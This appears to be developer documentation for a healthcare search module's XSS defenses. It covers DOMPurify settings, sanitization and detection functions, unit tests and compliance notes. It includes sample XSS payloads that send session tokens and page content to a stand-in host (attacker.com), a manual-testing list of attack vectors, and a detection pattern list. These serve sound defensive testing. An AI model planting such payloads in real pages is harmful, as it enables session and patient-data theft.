# Search Module Security

## Overview

The search module implements multiple layers of defense against XSS (Cross-Site Scripting) attacks and other security threats. This document explains the security mechanisms and how to use them correctly.

## XSS Prevention Strategy

### The XSS Vulnerability

XSS vulnerabilities occur when untrusted HTML from Elasticsearch is rendered directly in the page without sanitization. An attacker could inject malicious JavaScript that:

1. **Steals session tokens**: Reads `localStorage.token` and sends to attacker server
2. **Steals PHI**: Reads sensitive patient data from the page
3. **Hijacks session**: Creates authenticated requests on behalf of the user
4. **Modifies content**: Changes what the user sees on the page
5. **Redirects**: Sends user to phishing site

### HIPAA Implications

A successful XSS attack could:
- **Breach patient privacy**: Expose PHI to unauthorized parties
- **Create audit trail issues**: Searches logged under wrong user
- **Trigger HIPAA violations**: Unauthorized access to patient records
- **Result in penalties**: Up to $1.5M per violation

### Our Defense

We prevent XSS using **DOMPurify**, a well-tested JavaScript library that sanitizes HTML by:

1. **Parsing HTML**: Converting HTML string to DOM elements
2. **Whitelist validation**: Keeping only allowed tags/attributes
3. **Attribute stripping**: Removing all event handlers and scripts
4. **Reconstruction**: Building safe HTML with only allowed content

## DOMPurify Configuration

### Configuration

```typescript
DOMPurify.sanitize(html, {
  ALLOWED_TAGS: ['mark'],           // Only <mark> tags allowed
  ALLOWED_ATTR: [],                 // No attributes allowed
  KEEP_CONTENT: true,               // Preserve text if tags stripped
  RETURN_TRUSTED_TYPE: false        // Return string (not TrustedHTML)
})
```

### Why These Settings?

| Setting | Value | Reason |
|---------|-------|--------|
| `ALLOWED_TAGS` | `['mark']` | Only safe tag for highlighting results |
| `ALLOWED_ATTR` | `[]` | No attributes = no event handlers |
| `KEEP_CONTENT` | `true` | If script is stripped, text remains readable |
| `RETURN_TRUSTED_TYPE` | `false` | Vue can work with string output |

## Sanitization Implementation

### Location

`frontend/src/utils/sanitize.ts`

### Function: `sanitizeHtml()`

```typescript
/**
 * Sanitize HTML content allowing only safe tags
 *
 * @param html - Raw HTML string from Elasticsearch
 * @returns Sanitized HTML safe for v-html rendering
 */
export function sanitizeHtml(html: string): string {
  if (!html) return ''

  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['mark'],
    ALLOWED_ATTR: [],
    KEEP_CONTENT: true,
    RETURN_TRUSTED_TYPE: false
  })
}
```

### Function: `sanitizeHighlights()`

```typescript
/**
 * Sanitize search result highlights
 *
 * Handles the highlight object structure from Elasticsearch
 * with multiple arrays of highlight snippets
 */
export function sanitizeHighlights(
  highlights: Record<string, string[]>
): Record<string, string[]> {
  if (!highlights) return {}

  const sanitized: Record<string, string[]> = {}

  for (const [field, snippets] of Object.entries(highlights)) {
    sanitized[field] = snippets.map(snippet => sanitizeHtml(snippet))
  }

  return sanitized
}
```

### Function: `containsSuspiciousHtml()`

```typescript
/**
 * Check if content contains potentially malicious HTML
 *
 * Used for logging/monitoring suspicious content
 * Does NOT prevent XSS (use sanitizeHtml for that)
 */
export function containsSuspiciousHtml(html: string): boolean {
  if (!html) return false

  const suspiciousPatterns = [
    /<script/i,
    /javascript:/i,
    /on\w+\s*=/i,           // onclick, onerror, onload, etc.
    /<iframe/i,
    /<object/i,
    /<embed/i,
    /data:text\/html/i      // data: URIs
  ]

  return suspiciousPatterns.some(pattern => pattern.test(html))
}
```

## Usage Examples

### Safe Rendering

```vue
<!-- CORRECT: Using sanitizeHtml -->
<div v-html="sanitizeHtml(result.highlights.title[0])" />
<!-- Output: Patient <mark>discharged</mark> on 2024-01-15 -->

<!-- Alternative: Without highlights -->
<div>{{ result.title }}</div>
<!-- Output: Patient Discharged on 2024-01-15 -->
```

### Testing Dangerous Input

```typescript
// These are all sanitized correctly:

sanitizeHtml('<script>alert("XSS")</script>')
// Output: '' (script removed, no text content)

sanitizeHtml('Patient <mark>discharged</mark>')
// Output: 'Patient <mark>discharged</mark>' (mark preserved)

sanitizeHtml('Patient <img src=x onerror="alert(1)"> discharged')
// Output: 'Patient  discharged' (img and event handler removed)

sanitizeHtml('Patient <iframe src="evil.com"></iframe> discharged')
// Output: 'Patient  discharged' (iframe removed)

sanitizeHtml('Click <a href="javascript:alert(1)">here</a>')
// Output: 'Click here' (a tag and javascript: URL removed)
```

## XSS Attack Examples

### Attack 1: Script Injection

```javascript
// Attacker input in Elasticsearch
"Patient <script>fetch('http://attacker.com/steal?token=' + localStorage.token)</script> discharged"

// Without sanitization: Script runs and steals token
// With sanitizeHtml: Script is removed
// Result: "Patient  discharged"
```

### Attack 2: Event Handler

```javascript
// Attacker input
"Patient <img src=x onerror=\"fetch('http://attacker.com/steal?data=' + document.body.innerHTML)\"> discharged"

// Without sanitization: Event handler fires and steals page content
// With sanitizeHtml: Event handler is removed
// Result: "Patient  discharged"
```

### Attack 3: Data URI

```javascript
// Attacker input
"Patient <a href=\"data:text/html,<script>alert('XSS')</script>\">click</a>"

// Without sanitization: Clicking link runs script
// With sanitizeHtml: Link tag is removed
// Result: "Patient click"
```

### Attack 4: IFRAME Injection

```javascript
// Attacker input
"Patient <iframe src=\"http://attacker.com/phishing\"></iframe> discharged"

// Without sanitization: Iframe loads malicious content
// With sanitizeHtml: Iframe is removed
// Result: "Patient  discharged"
```

## Testing

### Unit Tests

All XSS scenarios should be tested. See `tests/unit/utils/sanitize.spec.ts`:

```typescript
import { describe, it, expect } from 'vitest'
import {
  sanitizeHtml,
  containsSuspiciousHtml
} from '@/utils/sanitize'

describe('sanitizeHtml', () => {
  it('removes script tags', () => {
    const input = '<script>alert("XSS")</script>'
    const output = sanitizeHtml(input)
    expect(output).not.toContain('<script>')
  })

  it('preserves mark tags', () => {
    const input = '<mark>important</mark>'
    const output = sanitizeHtml(input)
    expect(output).toContain('<mark>')
  })

  it('removes event handlers', () => {
    const input = '<img src=x onerror="alert(1)">'
    const output = sanitizeHtml(input)
    expect(output).not.toContain('onerror')
  })

  it('removes javascript: URLs', () => {
    const input = '<a href="javascript:alert(1)">click</a>'
    const output = sanitizeHtml(input)
    expect(output).not.toContain('javascript:')
  })

  it('removes data: URIs', () => {
    const input = '<a href="data:text/html,<script>alert(1)</script>">click</a>'
    const output = sanitizeHtml(input)
    expect(output).not.toContain('data:text/html')
  })

  it('removes iframe tags', () => {
    const input = '<iframe src="http://attacker.com"></iframe>'
    const output = sanitizeHtml(input)
    expect(output).not.toContain('iframe')
  })
})

describe('containsSuspiciousHtml', () => {
  it('detects script tags', () => {
    expect(containsSuspiciousHtml('<script>')).toBe(true)
  })

  it('detects event handlers', () => {
    expect(containsSuspiciousHtml('onclick=')).toBe(true)
  })

  it('returns false for safe HTML', () => {
    expect(containsSuspiciousHtml('<mark>safe</mark>')).toBe(false)
  })
})
```

### Manual Testing

Test with these payloads to verify sanitization:

1. **Basic XSS**: `<script>alert('XSS')</script>`
2. **Event handler**: `<img src=x onerror="alert(1)">`
3. **SVG vector**: `<svg onload="alert('XSS')">`
4. **HTML5 tag**: `<details open ontoggle="alert('XSS')">`
5. **Iframe**: `<iframe src="http://attacker.com"></iframe>`
6. **Meta refresh**: `<meta http-equiv="refresh" content="0;url=http://attacker.com">`
7. **Base tag**: `<base href="http://attacker.com">`
8. **Form hijack**: `<form action="http://attacker.com/phish">`

All should be sanitized without leaving malicious code.

## Security Best Practices

### ✅ DO

1. **Always sanitize before rendering**:
   ```vue
   <div v-html="sanitizeHtml(userContent)" />
   ```

2. **Use v-html only when necessary**:
   ```vue
   <!-- Preferred: No v-html needed -->
   <div>{{ plainText }}</div>

   <!-- Acceptable: v-html with sanitized content -->
   <div v-html="sanitizeHtml(htmlContent)" />
   ```

3. **Test with malicious payloads**:
   ```typescript
   const dangerous = '<script>alert("XSS")</script>'
   const safe = sanitizeHtml(dangerous)
   expect(safe).not.toContain('<script>')
   ```

4. **Audit external data**:
   ```typescript
   if (containsSuspiciousHtml(elasticsearchResult)) {
     console.warn('Suspicious HTML detected:', elasticsearchResult)
     // Log for security review
   }
   ```

5. **Keep DOMPurify updated**:
   ```bash
   npm outdated dompurify
   npm upgrade dompurify
   ```

6. **Limit allowed tags**:
   ```typescript
   // Good: Only allow what you need
   ALLOWED_TAGS: ['mark']

   // Bad: Allow too many tags
   ALLOWED_TAGS: ['p', 'div', 'span', 'b', 'i', 'u', 'mark']
   ```

### ❌ DON'T

1. **Never render unsanitized HTML**:
   ```vue
   <!-- WRONG: XSS vulnerability! -->
   <div v-html="result.highlights.title" />
   ```

2. **Never trust user input**:
   ```typescript
   // WRONG: Users can inject HTML in search query
   <div v-html="userSearchQuery" />
   ```

3. **Never disable sanitization**:
   ```typescript
   // WRONG: Disables protection
   DOMPurify.setConfig({ ALLOW_DATA_ATTR: true })
   ```

4. **Never use innerHTML directly**:
   ```javascript
   // WRONG: Direct DOM manipulation bypasses Vue's protection
   document.getElementById('results').innerHTML = htmlString
   ```

5. **Never concatenate user input**:
   ```javascript
   // WRONG: Can create unescaped HTML
   const html = '<div>' + userInput + '</div>'
   ```

6. **Never allow script-like attributes**:
   ```typescript
   // WRONG: Allows event handlers
   ALLOWED_ATTR: ['class', 'onclick', 'onload']
   ```

## Compliance Impact

### HIPAA

**Risk**: XSS could expose PHI
- **Prevention**: Sanitization prevents unauthorized access
- **Audit logging**: Search queries logged (without PHI)
- **Encryption**: Session tokens cannot be stolen if XSS prevented

### GDPR

**Risk**: XSS could expose personal data
- **Prevention**: Sanitization prevents data exposure
- **Data minimization**: Only safe HTML rendered
- **User rights**: Data theft prevented by sanitization

### FDA 21 CFR Part 11

**Risk**: XSS could modify clinical content
- **Prevention**: Sanitization prevents content modification
- **Integrity**: Search results cannot be altered by attackers
- **Audit**: All access logged (secure against XSS)

## Monitoring & Response

### Security Monitoring

Log suspicious content for investigation:

```typescript
if (containsSuspiciousHtml(elasticsearchResult)) {
  logger.warn('SECURITY: Suspicious HTML in search results', {
    result_id: result.id,
    timestamp: new Date().toISOString(),
    user_id: currentUser.id,
    snippet: elasticsearchResult.substring(0, 100)
  })
}
```

### Incident Response

If XSS is detected:

1. **Isolate**: Identify affected results in Elasticsearch
2. **Investigate**: Check access logs for unauthorized access
3. **Remediate**: Purge malicious data from Elasticsearch
4. **Notify**: Alert affected users of potential exposure
5. **Review**: Check for similar attacks in other indices

## Dependencies

### DOMPurify Version

```json
{
  "dependencies": {
    "dompurify": "^3.0.6"
  }
}
```

### Security Updates

Subscribe to DOMPurify security advisories:
- GitHub: https://github.com/cure53/DOMPurify/security/advisories
- NPM: npm security audit reports

## Related Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify GitHub](https://github.com/cure53/DOMPurify)
- [Vue.js Security Best Practices](https://vuejs.org/guide/best-practices/security.html)
- [HIPAA Security Rule](https://www.hhs.gov/hipaa/for-professionals/security/index.html)

## Frequently Asked Questions

### Q: Why only allow `<mark>` tags?

**A**: Elasticsearch highlights search matches with `<mark>` tags. Any other HTML is not needed and presents a security risk. By whitelist-only approach, we ensure safety.

### Q: What if I need other tags like `<b>` or `<i>`?

**A**: Use CSS instead:
```vue
<span style="font-weight: bold;">text</span>
<span style="font-style: italic;">text</span>
```

Or plain Vue text:
```vue
<template>
  <strong>{{ text }}</strong>
  <em>{{ text }}</em>
</template>
```

### Q: Is sanitization slow?

**A**: No. DOMPurify is optimized and sanitization takes <10ms per highlight. With pagination, we never sanitize >20 results per page.

### Q: What about legitimate HTML in documents?

**A**: Documents are retrieved from secure PostgreSQL storage, not user input. They're only sanitized when displayed with highlights from Elasticsearch, which could be user-controlled.

### Q: Can I customize sanitization rules?

**A**: Only with careful review. All changes must be security-audited. For custom rules, create a new utility function and document the security implications.

---

**Last Updated**: 2025-11-21
**Security Version**: 1.0.0
**Review Status**: ✅ Security-reviewed
